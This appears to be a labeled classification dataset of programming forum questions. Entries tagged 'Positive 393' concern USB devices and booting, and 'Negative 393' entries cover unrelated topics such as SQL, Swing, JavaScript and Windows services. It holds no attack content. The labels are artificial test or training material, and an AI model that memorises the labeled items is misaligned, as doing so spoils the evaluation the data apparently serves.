Positive 393 pI have Fedora 22 installed on my laptop and wrote Lubuntu 14.04 to an 8GB usb drive as well as selected to install a boot loader on the USB. The first time I tried to boot to the USB it worked and I had all my boot options for the USB and my laptop. But, when I disconnected the laptop, I was left with the grub shell. So, in trying to fix this, I manually installed a boot loader to my main partition on my laptop which got the laptop booting working without the USB stick. But, now, the USB wont give me any boot options when its connected. I have tried 3 different installs and even tried selecting to install the boot loader again on the USB and nothing is working. Is there not a way to have two boot loaders, one on the laptop and one on the usb Would me manually installing grub2 to the laptop partition have any affect on the USB booting Pleeeeease help.p
Positive 393 pIm using win764bitp  pI am in the process of developing a user interface for a USB CDC device used as a flash programmer I am adding in exception handlers and constantly testing, but whenever something does go wrong and the program crashes, the USB device disappears from device manager and will not reconnect. I uninstall and reinstall the driver which I have made automatic in the c GUI but this doesnt fix it either. Nor does resetting the computer, changing USB ports, etc.. The only way I know to fix it is to delete the registry entries for the specific PID  VID stuff and then unplug the USB and plug it back in. Windows the reinstalls it because it still has the inf file and it works perfectly. This shouldnt be an issue in the release version, but for testing it has been a real problem constantly going through that process. p  pMy question is why is this happening p

Positive 393 pHello USB  Linux gurusp  pI have an embedded system based on an Atmel ARM CortexA5 CPU.  It runs embedded Linux kernel V3.10 that configures its highspeed USB port as a USB device.p  pThe USB device is configured as a USB composite made up of HID, NDIS Ethernet and MTP.  Everything is working well.p  pHowever When plugging in this embedded system into a host OS like Windows, a situation arises when I must notify Window of the new MTP device.  Currently the only way I know how to do that is to physically unplug the USB cable from the embedded system and plug it back in.  Windows then notices the new MTP connection, opens a folder pointing to the files on my device and everything is greatp  pI would like to find a way to do exactly the same thing programmatically... in other words bring my USB device port down and up just as if I were using ifconfig for Ethernet.p  pIs there some command I can use to suspend and resume a USB device portp  pThank you very muchp  pJeanPierrep  pP.S. The USB driver Im using is called atmelusbaudc.c and contains functions like atmelusbastop and atmelusbastart that Id like to invoke from userspace.p

Positive 393 pquestion In my Arduino  main loop, the interrupt must always enabled to process some events.  At the same time the there are heavy IO with USB port using Serial.print.  But the IO also uses interrupt.  Some times they cause conflict and hang the program, some time not.  The events are not predictable.  So what I can do is during the IO, disable the interrupt then reenable it using noInterrupts and interrupts pair for every IO.  But this is too expansive.  Any suggestionp

This means that I would have to adddelete records in the lookup table based on the new contract [EndDate] and to me this seems a bit messy.p  pSo this leads me to my question, is there a pure SQL approach that can get me a schedule of notifications without creating a look up table Cursors are not allowed P but I hoping CTEs would work here.p  pIf I have not given enough information then please ask.p
Negative 393 pIve designed a simple program that has a counter class and inside that counter class I have methods that increment the count, deincrement the count, and so on.

Negative 393 pdoes anybody know agood way in granting a connection from one service to another, so that both services benefits fromeach otherp  pI would like to have an easy but never the less safe way to do a connection between my server and another server, but I dont know how to do that.p  pIt should be ... easy, so that neither the user nor the service providers have to waste alot of time traffic effecient, so that traffic is not wasted and conenction is fast encrypted, so that no person in between can use the transmitted data and it should be an open and flexible standard, so that there could be more connections to other services with my server in the middle of this star connection and no connection in between all providers and that I dont have to pay a fee .p  pthe example in the title is something I think about, because when you have a twitter account you somehow connect facebook to your account and facebook can show your twitterfeeds on your account. but I dont want a provider to gather a lot of information beside the really important one that the user want to transmit. so I dont want the provide to get the username of my user and I dont really need to know how my user is named there. Its like a postoffice box. you just have to know where to put your letter, but you dont need to know the box owners name. and I dont want the mailcarrier to know what he is delivering, so it should be encrypted.p  pevery clue how to do that would be fine, because I dont know anything about this p  pthank you in advance, Andreasp

Negative 393 pIve Googled, Binged, and here at StackOverflow, looked through the related questions and searched, but Im not finding what Im looking for.  Ive also searched documentation on DNN.p  pWhat Im looking for is any guidance tutorials, blogs, stepbystep instructions for setting up a repository etc from people who are experienced in using DotNetNuke with SVN.p  pWe use SVN for all our source control, and have no problem with standard applications, because we pretty much built the repository and directory structure to work with our processes.  This means when we do web sites, in Visual Studio, we do file based web sites, rather than setting them up in the local IIS.  It just makes things easier for us.p  pHowever, with DNN, it appears that even if you get the source code, it is expecting to be set up in the local IIS, which means additional headaches for us. p  pFor example, we are moving all of our source code off our local C drives, and onto a shared drive on a server.  This is to enable backups in addition to our normal source control.  This was a management decision.  So that means that we need to change the virtual web app when we make the move.p  pHas anyone come up with a good way to work around this  Can DNN be set up so that the developer web server in Visual Studio can be used, so that we can treat it just like any normal web app  Am I missing something obviousp

Negative 393 pI have a program that can open multiple forms, and when there are a lot of them, they cascade when they are opened.p  pWhen a button is pressed, some code runs and the form closesp  pthis.Visible  false Kill.Zombies this.Closep  pMy Kill.Zombies method takes a few seconds to run, so I make the form invisible before running it.

Negative 393 pstrongANSWERstrong There isnt a natively managed equivalent for this method. However, a good example managed code API can be found over at a hrefhttpwww.pinvoke.netdefault.aspxuser32.getkeyboardstate relnofollowpinvoke.neta.p  pHi allp  pI have an application that accepts a flag for trace mode. Trace mode turns on a form containing a text box. The text box displays output via a custom TraceListener object. If there is a t present on the commandline, the trace window will be opened from within its own lowpriority thread. Its handy for consultants that are trying to diagnose the application when something goes wrong.p  pA few consultants have requested that pressing some obscure key combination during startup should turn on trace mode so they dont have to go to the command line to activate it every time. Its a reasonable request.p  pI dont want to give them a button or menu item for this because a lot of the critical information that the consultants will care about is displayed to Trace at startup before the main form is created as the various components are instantiated and initialized.p  pI thought it should have been simple enough to detect the current keyboard state in .NET  but it seems that everywhere I look, the advice is to use [DllImportuser32.dll, EntryPoint  GetKeyboardState, SetLastError  true] as the method to detect whats going on.p  pThats all well and good  Im comfortable with that. However, as a general rule of thumb I try to make sure I use native .NET managed code for Windows functions before I go trying to roll my own.p  pIs there a native .NET method or equivalent to user32.dlls GetKeyboardStatep

Negative 393 pI have a page that has three divs one at the top, one at the side, and one content div in the bottom left. The content div contains a series of divs. and I want a button that allows you to step through them highlighting them one at a time. However, the content div contains more data than can fit on a screen, and so I put it in an overflow scroll.

Negative 393 pI have a VS208 solution with several projects in it.  The main WinForms client project has a project reference to a library project within the solution.

I cant see how to force the Winforms client to also use the v11 binaries as this project doesnt have any direct reference to these binaries.  Ive done a clean and rebuild on the solution without success and no other project in the solution is using the interop assemblies and therefore referencing the incorrect version.p  pAny help with forcing the client to build with the v11 binaries would be greatly appreciated.p

Negative 393 pAbout 6 months ago I switched from TextMate to MacVim for all of my development work, which primarily consists of coding in Ruby, Ruby on Rails and JavaScript. p  pWith TextMate, whenever I needed to run a spec or a test, I could just commandR on the test or spec file and another window would open and the results would be displayed with the pretty format applied.  If the spec or test was a lengthy one, I could just continue working with the codebase since the testspec was running in a separate processwindow. After the test ran, I could click through the results directly to the corresponding line in the spec file.p  pTim Popes excellent rails.vim plugin comes very close to emulating this behavior within the MacVim environment. Running Rake when the current buffer is a test or spec runs the file then splits the buffer to display the results. You can navigate through the results and key through to the corresponding spot in the file.p  pThe problem with the rails.vim approach is that it locks up the MacVim window while the test runs. This can be an issue with big apps that might have a lot of setupteardown built into the tests. Also, the visual redgreen html results that TextMate displays via format pretty, Im assuming is a bit easier to scan than the split window.p  pThis guy came close about 18 mos ago a hrefhttpcassiomarques.wordpress.com20090109runningrspecfilesfromvimshowingtheresultsinfirefox relnofollowhttpcassiomarques.wordpress.com20090109runningrspecfilesfromvimshowingtheresultsinfirefoxa The script he has worked with a bit of hacking, but the tests still ran within MacVim and locked up the current window.p  pAny ideas on how to fully replicate the TextMate behavior described above in MacVimp  pThanksp

Each of these applications is an iframe that has access to an API defined in the parent frame of the applications. Lets say this API had the function requestFocus  no arguments allowed, as defined in the API spec that I am implementing. In order to give the right iframe focus, I would have to know which iframe called the requestFocus function.

To do this Ive written a GenreProvider and this just gets a list of the available codeGenrecode objects. In the unit tests, this works fine.

Negative 393 pi am working on an applet with around ten different datasourcese.g. statisticserrorlog.... Each datasource is updated by a single network connection and reports updates via the observer mechanism. The applet has different views which display parts of the data. Every view is only interested in some parts of the data and registers itself as an Observer at the necessary Observables. p  pThe viewsextended JPanels mostly consist of standard swing components e.g. JLabels, JButton, .... Some attributes of the components in the views depend on information from the underlying data model.p  pExamplep  precodeStatisticPanelpaintComponentGraphics g    clearStatisticButton.setEnabledstat.hasEntries   minValueLabel.setTextstat.getMinValue   super.paintComponentg  codepre  pThis logic is implemented in the codepaintComponentcode method of the StatisticPanel and the codeupdatecode methods just calls repaint, because I didnt want the manipulate the components outside of the EDT.p  pIs this the intended way of updating swing components in a multithreaded environment Is it better to use a Runnable with codeSwingUtitlies.invokeLatercode Are there better approaches for this problemp  pThanks in advance.p
Negative 393 pLast night I was trying to put a simple tutorial to build an application using the stack  Spring 2.5  JPA 1.0  Hibernate downloading for first time, so didnt know which version to use. Unfortunately I didnt want to use Maven as the target participants were on ANT build. As usual hit the search engine and got somehow the steps in the appcontext, persistence.xml and in the java classes. The moment I started getting required libraries, I lost in the JAR hell. Luckily, not much of a problem on the Spring side as all the dependent JARs are packaged together for my Spring 2.5.6.p  pWhen it came to hibernate, I had no clue which all Jars to be included on the first place. On the next challenge, didnt know which version for each to add.p  pFinally I got the whole thing working, but it looks so scary to enter this JAR hell again unless I am taken through Maven heaven.p  pWith lots of interceptors and weaving, it is becoming more complicated for the conventional Java programmer who once liked Java primarily for lots of transparency on what my code is doing.p  pAm I right in the thought processp

The backend database is developed in MS SQL Server 2008p  h1My Approachh1  pSince, i am new to .net world. So i surf over internet and found the typed data set the most  easier way, i.e using wizards rather than coding and hence i use type dataset for database connectivity.p  h1My Questionh1  pI have faced lot of criticism for using typed data sets .  Some one say its not efficent, some one say its harder to extend . . . and so on  Now i only want to ask that what is the best way of making database connectivity especially, for large scale project. I am only asking this because i an new to this field. However i study from internet and found the another way through coding i.e There exist classes for each thing DataSet, DataTable, DataRow, Connection etc.. Is it better way or there exist some thing else. Some sample code or a web resource guiding how to do this would be more helpfulp

Negative 393 pI am taking my first OOP class learning Java in the fall so Ive been reading up about it and going through little introductions to the language to get myself acquainted before school. Im very excited to learn Java but feel Im more at home with JavaScript. Ive done a few projects with it and am working on taking my code to the next, more professional level if you want to say that by using OOP in JS.p  pCurrently I am working on dragging script and have it pretty much pinned down with procedural programming. Since this project is fresh in my memory, I am starting with this project to begin my move to objects. What is tripping me up here is the idea of having a Drag object . . .p  precodefunction Drag       Drag code goes here    constructor codepre  pIm taking fairly well to the idea of OOP, but this stumps me. In all the examples Ive gone through, the objects were always, well, objects. They were animals or cars, or a bike, etc. I have yet to come across the object of a embehaviorem. Im just not sure how it would work . . . If any of you have any advice on this, Id appreciate it.p  pNow for inheritance I havent had to use inheritance quite yet, but the subject interests me with JavaScript because so many people have put their 2 cents in about it. I think the most popular ways, though, that Ive seen are a hrefhttpejohn.orgblogsimplejavascriptinheritance relnofollowJohn Resigsa and a hrefhttpjavascript.crockford.comprototypal.html relnofollowDouglas Crockfordsa ways of inheritance.p  pI think they are very neat workarounds but for some reason I dont really like that they both require assignment. I guess I just feel like they shouldnt have to work that way. So, after looking through some more examples and at Crockfords method, I came up with this very sorry if someone else already has, I just havent seen itp  precodeObject.prototype.extend  function Obj      use strict  for jslint      this.prototype  new Obj     this.prototype.constructor  this     return this  codepre  pHere is an example of it in use, I stole the example from a hrefhttpmckoss.comjscriptobject.htm relnofollowherea then modified it a bitp  precodeObject.prototype.inObj  1  function A      use strict     this.inA  2   A.prototype.inAProto  3  function B      use strict     this.inB  4    HERE IT IS  B.extendA  B.prototype.inBProto  5  var w  new A var x  new B  document.body.innerHTML  x.inObj  ,   x.inA  ,   x.inAProto  ,   x.inB  ,   x.inBProto  1, 2, 3, 4, 5 document.body.innerHTML  ltbr gt document.body.innerHTML  w instanceof A ampamp w instanceof Object ampamp x instanceof B ampamp x instanceof A ampamp x instanceof Object  true codepre  pTo me it looks and feels syntactically nice, I wonder how seasoned JS developers would feel about it. I tested it, and I know that you can place codeB.extendAcode before the definition for codeBcode but you cannot place it after codeB.prototype.inBProtocode or the list will become 1, 2, 3, 4, undefined because in the codeextendcode method, codeBcodes prototype is being reset.

Negative 393 pIm having a bit of trouble with an application im developing. Heres the scenario I have two Windows Services Service A and Service B written in C. p  pService A is responsible to transfer data between two applications using WebServices, FTP connections, etc. Its also responsible to update Service B.p  pService B is responsible to update Service A and update a Web Application.p  pThe basic operation of updates is lets say this is the process to update service A, done by Service Bp  ol liCheck for updates through WebServicesli liIf there is a new version, stop the service using C ServiceController.li liBackup current files of the service so I can do a Rollback if something goes wrongli liUninstall the service using sc delete commandli liDownload the updated files of the service using FTP connectionli liExecute some SQL Server scripts, if existli liInstall the Windows Service using sc create commandli liStart Service using C ServiceControllerli ol  pEverything runs smoothly until step 7. I figured that the problem is that the user doing the update the user that runs Service B does not have permissions to create new windows services, so SC Create always returns something like [SC] OpenSCManager FAILED 5 Access is denied  Note that I had both services running with LocalSystem Account. So, I figured that this account cannot create new Windows Services correct me if Ive assumed wrong. p  pAfter this Ive created a new Windows User, just to run the services. The idea was to give this user the necessary permissions to network shared, files and create services. However, this user still cant create the service.p  pHeres what Ive triedp  ol liGive the user cmd.exe and sc.exe permissions using CACLS.li liUse PsExec to run cmd with i s instead of cmd.exe directly.li liUsing the a hrefhttpwww.microsoft.comdownloadendetails.aspxdisplaylangenampid23510 relnofollowSubInAcla command so the user has permissions to the both Windows Service. But heres the thing, at the time I dont have any Service, so it doesnt work.li ol  pSome remarkesp  ul liThis Windows Services dont have any installer. li liThe SC command is run using C ProcessStartInfo.li liThe SC command specifies the user and password of the Windows User that Ive created.li liI really dont want the Windows Services to be run under a user account with Administrative Privileges.li ul  pI know that this thread is similar to some already here a hrefhttpstackoverflow.comquestions1092986autoupdateawindowsserviceAutoupdate a Windows Servicea, however I cannot find any working solution anywhere. p  pSorry for the long textp

Negative 393 pI was trying to find this on facebooks site in their documentation but so far no luck.  Im sure others must have run into this before.  p  pI use Amazon S3 for storing images.  I didnt know ahead of time that if I named my bucket as my domain name with subdomain I could link that way, so until I move all of the pictures I have to link to mybucket.s3.amazonaws.com domain.  When I include a picture from there with a post to the wall the picture doesnt show up.  If I change the picture to one on the server itself the picture does show up.  It seems that the domain name of the picture must match my app  I looked at bugzilla and didnt see this mentioned.  Facebooks forum says to post questions here.p  pIm using the C Facebook SDK from CodePlex.p  pMy code looks like with error handling and authentication check removedp  precode        var client  new FacebookClientFACEBOOKAPPID, FACEBOOKSECRET         client.AccessToken  facebook.AccessToken         var parameters  new Dictionaryltstring, objectgt     parameters.Addname, name         parameters.Addcaption, title         parameters.Addmessage, message         parameters.Addlink, link         parameters.Addsource, link         parameters.Addpicture, imageUrl         client.Postmefeed, parameters codepre  pI verified that imageUrl does indeed have a correct picture, the domain name just doesnt match.  The picture on amazon s3 has public read access.  I can view it from my browser so I dont think its a permission problem.  Ive tried a few different pictures with the same problem.  Only time its worked so far is when the picture was on the server itself.p  pSo, my question is, is it a problem with me, or does facebook block images that dont match the domain name specified on the appp

Negative 393 pIve deployed an ASP.NET on EC2 using AWS Cloudformation. In Visual Studio, the AWS Toolkit adds the Publish to CloudFormation menu item. This creates the required Cloudformation template using a choice of machines, such as Micro and Large, targeting Win 2008 R2.   As I would use a small instance more powerful than Micro but cheaper than Large, and use the convenience of Cloudformation from Visual Studio, I tried copying the template that is generated and use this as a new template for Cloudformation, using an AMI that targets Win 2008 and so runs on a 32bit small machine. However I get an error as the template references config file items created on the fly.p  pWhat is the best way to use the small instance from within AWS Toolkit on AWS Cloudformation, without having to set up instances, etc.p

Negative 393 pIve used the Robot class in java numerous times as a quick workaround on menial tasks. Stopping execution is always a problem which needs to be numerous times during testing. What I want is a KeyListener that will listen for a keycombination of keys and will stop the program. From my brief readings, it seems you cant embed a key listener without a frame or something of the like in focus. To me, focus means the forefront window. Is this the wrong definition If this is the correct definition, I cant keep the window in focus because I am crawling around with my robot. How can I solve this problemp  pWhile typing this, I came up with an unideal solution of programmatically bringing the window into focus, testing for the keypress, then programmatically bringing it out of focus and continuing. Is this possible Is there a better wayp

Negative 393 pIn JSF 2.0, the most obvious usecase for the view scope is a single page with potentially multiple AJAX postbacks.

Negative 393 pIm getting some interesting behaviour in SQL Server 2012 when using the RANGE option with window aggregate functions, and am not sure if this is a bug or a feature of SQL Server 2012.  I have a table defined as followsp  precodeCREATE TABLE [Test].[Trades]     [ID] [int] IDENTITY1,1 NOT NULL,     [Member] [varchar]20 NOT NULL,     [TradeDate] [date] NOT NULL,     [Fund] [varchar]4 NOT NULL,     [Units] [decimal]28, 8 NOT NULL,     PRIMARY KEY CLUSTERED               [ID] ASC       codepre  pThis table stores the trades that a member makes in a fund on a particular trade date.  A member is able to make 1 trade in a given fund on a given date.  In addition to the clustered index I have a nonclustered index defined as followsp  precodeCREATE NONCLUSTERED INDEX [IxTradesIndex] ON [Test].[Trades]      [Member] ASC,     [Fund] ASC,     [TradeDate] ASC  INCLUDE [Units] codepre  pIf I wish to query the data set to give me the running total of units that each member has in each fund then using the extensions to the window aggregates in SQL Server 2012 I can answer the question as followsp  precodeSELECT T.Member, T.Fund, T.TradeDate,  SUMT.Units OVERPARTITION BY T.Member, T.Fund             ORDER BY T.TradeDate             RANGE BETWEEN UNBOUNDED PRECEDING              AND CURRENT ROW AS TotalShares FROM Test.Trades AS T codepre  pThis will give me a data set similar to below example shows a member who made 1 trade in Fund2 on 20050203p  p....p  pMember1, Fund1, 20050331, 0.00p  pMember1, Fund2, 20050203, 3256.50p  pMember1, Fund2, 20050203, 3256.50p  p....p  pThe RANGE option has ensured that where the ordering clause is not unique i.e. a given member has made more than one trade in a given fund on a particular trade date that the window is includes all duplicate rows at the top of the range.  This is working correctly as expected. However, if I wish to say now give me only the distinct rows from this set i.e. get rid of the duplicate entries one way to ask this question is as followsp  precodeSELECT DISTINCT T.Member, T.Fund, T.TradeDate, T.TotalShares FROM      SELECT T.Member, T.Fund, T.TradeDate,          SUMT.Units OVERPARTITION BY T.Member, T.Fund                 ORDER BY T.TradeDate                 RANGE BETWEEN UNBOUNDED PRECEDING                  AND CURRENT ROW AS TotalShares     FROM Test.Trades AS T   AS T codepre  pHere things get interesting  what I am seeing is that with large data sets strongif the plan goes parallelstrong then the resulting set is nondeterministic i.e. the query gives the wrong answer and the number of rows that the query returns can change on subsequent runs of the query.  strongIf the plan does not go parallelstrong which I can obviously force by specifying OPTIONMAXDOP 1 then the query always returns the same number of rows, and the result set if the correct result set. To me this feels like a bug in SQL Server 2012.  p  pMy question is strongdoes anyone have an alternative explanation for this behaviour, or is this a bugstrongp

Negative 393 pI think understand the idea of duck typing, and would like to use it more often in my code. However, I am concerned about one potential problem name collision.p  pSuppose I want an object to do something. I know the appropriate method, so I simply call it and see what happens. In general, there are three possible outcomesp  ol lipThe method is not found and codeAttributeErrorcode exception is raised. This indicates that the object isnt what I think it is. Thats fine, since with duck typing Im either catching such an exception, or I am willing to let the outer scope deal with it or let the program terminate.pli lipThe method is found, it does precisely what I want, and everything is great.pli lipThe method is found, but its not the method that I want its a samename method from an entirely unrelated class. The execution continues, until either inconsistent state is detected later, or, in the worst case, the program silently produces incorrect output. pli ol  pNow, I can see how good quality names can reduce the chances of outcome 3. But projects are combined, code is reused, libraries are swapped, and its quite possible that at some point two methods have the same name and are completely unrelated i.e., they are not intended to substitute for each other in a polymorphism.p  pOne solution I was thinking about is to add a registry of method names. Each registry record would containp  ul limethod name unique i.e., only one record per nameli liits generalized description i.e., applicable to any instance it might be called onli lithe set of classes which it is intended to be used inli ul  pIf a method is added to a new class, the class needs to be added to the registry by hand. At that time, the programmer would presumably notice if the method is not consistent with the meaning already attached to it, and if necessary, use another name.p  pWhenever a method is called, the program would automatically verify that the name is in the registry and the class of the instance is one of the classes in the record. If not, an exception would be raised.p  pI understand this is a very heavy approach, but in some cases where precision is critical, I can see it might be useful. Has it been tried in Python or other dynamically typed languages Are there any tools that do something similar Are there any other approaches worth consideringp  pNote Im not referring to name clashes at the global level, where avoiding namespace pollution would be the right approach. Im referring to clashes at the method names these are not affected by namespaces.p

Negative 393 pI have a quite interesting problem thats making my head twist. Im working on a small system consisting of users and awards called badges. There is a special badge that is awarded to users depending on the following criteria 10 bronze badges, 5 silver badges and 1 gold badge.

Negative 393 pIm implementing a screenshot feature for Android 2.3 I know that ICS has a screenshot feature already. Im using the Android Screenshot Library ASL for short project as a base, and Im modifying it to suit my needs. I can also freely modify Androids source code for it. The goal is to have something like what the Galaxy Note does you take a screenshot with a key press combo and then an editor shows up which allows you to change the image however you like. You could take a screenshot anywhere on the main screen, while using apps, etc.p  pRight now I have 3 working parts a native binary that captures the screen buffer, a service that talks to the native binary and retrieves the screenshot, and the editor. But Im not sure how I could join the 3 things together. The native binary can be added to the Android prebuilt part and init.rc can be modified to execute it as root when booting I still have to do this though. The editor is a simple app that can be included in Android as well. But I still cant figure out what to do with the service.p  pIdeally Id like to capture a key press combo say power button and volume down, or maybe two of the front buttons, which would trigger the service. The service would then call the binary to take a screenshot and launch an intent to open the editor with the screenshot. However, as far as I know a service cannot catch key presses. Besides, the service has to be bound somewhere in order to know when it has to take a screenshot, so I guess that I should modify Android itself to start the service and bind to it at startup, but the documentation regarding Android source code is lacking and I have no clue where to start looking.p  pDoes anyone know what component of Android is in charge of the key presses, and where I should bind my service Is my approach even possible at allp  pThank you in advance for any possible help.p

Negative 393 pIve got quite a dilemma here and would like some suggestions from the community. Heres my problemp  pIve created a website that has lots of dynamic content, all content is pulled via AJAX and displayed via JS. The way Im currently allowing direct links to my content is by modifying the fragment identifier on the fly with JS, heres an examplep  pa hrefhttpwww.mysite.comhome123 relnofollowhttpwww.mysite.comhome123ap  pWhere 123 is the ID of the content. When the content is closed it strips the fragment identifier off again.p  pThis works wonderfully, and when people load the page my AJAX request is successfully requesting the 123 article. But Ive just implemented a Facebook like button on all the articles, and now Ive hit a brick wall.p  pBasically, the way Facebook finds what thumbnail and titles and URL to associate with your liked content is to check the meta tags of the URL passed into the fb like iframe. It does this by doing a GET request at the URL, checking the content of the meta tags, and then displaying those on Facebook.p  pThe problem is that fragment identifiers are not passed to the server, so I have no way in PHP that Im aware of to dynamically generate these meta tags with the content from the specifically requested article.p  pFor example, I wanted to be able to do something like thisp  precodeidvals  getidvalueshashfragment echo ltmeta propertyogtitle content.idvals[title]. gt codepre  pYour first thought is probably Why not use a GET request or query string i.e.p  pa hrefhttpwww.mysite.comhomeid123 relnofollowhttpwww.mysite.comhomeid123ap  pHowever the problem with this approach is that Javascript cannot dynamically change this portion of a URL, it can only change the fragment identifier. This means that all direct links to our articles will require page refreshes. This goes against our whole dynamic approach we have going  which I might add is really nice p  pSo Im kind of stumped at the moment. The only semisolution I can think of is to use an approach of bothp  pIn the fb like requests use get parameters and for direct links use fragment identifier.p  pBut this poses the following problemsp  ul liIf a direct link is pasted on Facebook from a user it will include the fragment identifier, and the correct meta data wont display on Facebook.li liI would need to do some weird redirection magic to fix the format of the URL to remove the ID i.e. detect if GET parameter is passed in and redirect to the fragment identifier equivalent. But I dont know if FB would also follow the redirect and fetch the meta tags from the redirected page instead of the first page, which would effectively make this solution useless anyway.li ul  pSorry for the wall of text Appreciate any input you can provide.p  pstrongEDITstrong I just tested my proposed solution involving a combination of both, and I can confirm Facebook follows the redirect, so this solution doesnt work at all. This is depressingp  pstrongEDIT EDITstrong One possible way to implement my mix idea is to use a window.location redirect instead of a PHP header call redirect, so Facebook fetches the meta tags from the original page, for those of you with a similar problem.p  pThanks.p

The GridSplitter doesnt work at all in fact it appears to render in the middle of the detail object.p  pI have a similar DataTemplate in a TabControl.ContentTemplate and it works as desired. Moving the GridSplitter causes scroll bars to show up on either side when necessary and opening up TreeView items causes scroll bars to show up in that control.p  pWhat I am after is an Excellike presentation where the user can control the sizes of the cells with horizontal and vertical splitters and the user objects within the cells scroll within the cell as necessary. I can live with fixedsize columns for now.p  pI would appreciate any help provided. Thanks.p

Negative 393 pIs there a way to tell if the Drawable Im getting back from getApplicationIcon is a defaultbuiltin icon or notp  pFor example, I have several applications installed on my emulator.

Negative 393 pI have a scroll view, containing a view into which I place paired background color imageviews and image imageviews.

I wish the thumbs to be fully opaque and the grey to be alpha 0,5.

Negative 393 pSo I am currently trying to render complex models at a decent speed, and having some trouble rendering a single model causes my framerate to become strained, without any added work in the program.  My model of which there is only one in the scene appears to be too large.  There are 444384 floats in the vertex array I upload to the buffer so 24688 triangles in the model.p  precodeCreate vertex buffers glGenBuffers1, ampmBuffer glBindBufferGLARRAYBUFFER, mBuffer     int SizeInBytes  mArraySize  6  sizeoffloat glBufferDataGLARRAYBUFFER, SizeInBytes, NULL, GLDYNAMICDRAW  Upload buffer data glBufferSubDataGLARRAYBUFFER, 0, sizeoffloat  VertArray.size, ampVertArray[0] codepre  pI know the size of the VBO is what makes the difference because A reducing the size improves performance, and B commenting out the rendering codep  precodeglPushMatrix  Translate glTranslatefmPosition.x, mPosition.y, mPosition.z  glMultMatrixfmRotationMatrix  Bind buffers for vertex and index arrays glBindBufferGLARRAYBUFFER, mBuffer  glEnableClientStateGLVERTEXARRAY glVertexPointer3, GLFLOAT, 6  sizeoffloat, 0 glEnableClientStateGLNORMALARRAY glNormalPointerGLFLOAT, 6  sizeoffloat, void12  Draw glDrawArraysGLTRIANGLES, 0, mArraySize  glDisableClientStateGLVERTEXARRAY glDisableClientStateGLNORMALARRAY  Unbind the buffers glBindBufferGLARRAYBUFFER, 0  glPopMatrix codepre  pleaves me with around 20002500 FPS, whereas uncommenting this code sinks me down to around 130FPS, or 8msframe which alone is more than enough, but I need to be able to do other things in the program as well, some of which might be CPUintensive.  A more complex model with 85k triangles brings that down to under 50 FPS, or around 20msframe, at which point the program visibly stutters.p  pThe one pair of shaders I use is very minimal at this point, I doubt thats the issue.  Here they are, just in case first the vertex shaderp  precodevoid main      vec3 normal, lightDir     vec4 diffuse     float NdotL      first transform the normal into eye space and normalize the result       normal  normalizeglNormalMatrix  glNormal      now normalize the lights direction. Note that according to the      OpenGL specification, the light is stored in eye space.

Id rather do that now than have to rewrite and restructure larger amounts of code in the future.p  pI have enabled backface culling I am not sure fustrum culling would help because at times, all or most of the model is onscreen I currently cull objects, but not triangles within individual objects.  Culling the faces in the viewport that are not facing the camera might help a bit, but Im not sure how to do that.  Beyond that, Im not sure what to do to optimize the rendering.  I havent implemented a vertex buffer yet, but Ive read that that might only increase the speed around 10.p  pHow do people achieve tens or hundreds of thousands of triangles onscreen at once at acceptable framerates with other stuff going on  What can I do to improve the performance of my VBO renderingp  pstrongUPDATEstrong As per comments below, I drew only half of the array as followsp  pglDrawArraysGLTRIANGLES, 0, mArraySize2p  pAnd then a quarter of the arrayp  pglDrawArraysGLTRIANGLES, 0, mArraySize4p  pReducing the amount of array drawn each time literally doubled the speed from 12 ms to 6 and 3 ms, respectively, yet the model was entirely intact  nothing was missing.

Negative 393 pI am implementing a hash table for a project, using 3 different kinds of probing. Right now Im working on linear.p  pFor linear probing, I understand how the probing works, and my instructor implied he wanted the step size to be 1. The thing is, no duplicates are allowed. So I have to search for a value before I insert it, right But what if the table is used to the point where all the cells are either occupied or deleted Then in order to search for a specific key to make sure it isnt in the table, Ill have to search the entire table. That means a search operation and by extension, an insert operation is On.p  pThat doesnt seem right, and I think I misunderstood something.p  pI know I wont have to run into the same issue with quadratic probing, since the table needs to be at least half empty, and it will only probe a determined number of elements. And for double hashing, Im not sure how this will work, because Ill also need to search the table to prove that the key to be inserted isnt present. But how would I know how to stop the search if none of the cells are never occupiedp  pSo In open hashing, where every entry in the table has been occupied in the past, does it take On probes to search for an element and insert, if no duplicates are allowedp

Negative 393 pIs it possible to run an arbitrary OS program on the selenium node before running testsp  pWhy I need such a weird thingp  pIn one test of the web application I need to simulate mouseover for 1 second, but the thing is  if there is a mouse pointer over the browser window then selenium webdriver doesnt keep mouseover event for long time. Its getting interrupted after several milliseconds and after that the real mouse pointer starts emitting the mouseover event.p  pSo what Id like to try is to run a trivial program that moves mouse cursor to the screen corner to not interfere with browser window.p  pAny ideasp  pstrongUPDstrong created a trivial app to run before starting a particular driver that would move cursor to the corner a hrefhttpsgithub.comzerkmsMoveCursor relnofollowhttpsgithub.comzerkmsMoveCursorap
Negative 393 pIm using css3 scale transform to scale a div that contains other divs inside.p  pThe problem I have is that some of the inner divs I need to keep as they were, basically as if they were not scaled, their size should not change, however I do need to scale the parent div with everything else inside.p  pHow can you reverse the scaling in some of the divsbr I am trying to apply an inverse scaling.br If the overall div had applied a value of 1.5 , Im trying to find what value I should now   scale the other divs to revert them visually to how they looked before.p
Negative 393 pIm looking for a way to easily filter from a collection of Model objects without hitting the database each time. By definition, QuerySets are lazy and always will hit the DB. So I am wondering if there is anything existing that can do this. If not, perhaps its a good library to create.p  pFor examplep  precodeallrecords  objectsetRecord.objects.filtercompanyuser.company codepre  pcodeobjectsetcode being a hypothetical function which would gather all of the objects in a QuerySet as static data. The result would be an object manager instance that could have filters run against it similar to QuerySet filters. This would be particularly useful in storing creating, updating, and deleting objects based on data from multidimensional lists of data.p  precodefor row in data   for col in row      this would not hit the DB. Only filter within the objectset in memory.     allrecords.filterdatecol.date, typecol.type, creatorcol.user codepre  pI realize I may be trying to solve this the wrong way, but regardless, I think this would be a great tool to have in Django. Does anyone know of an existing library or functionality within Django that would solve this problem Thanks in advancep

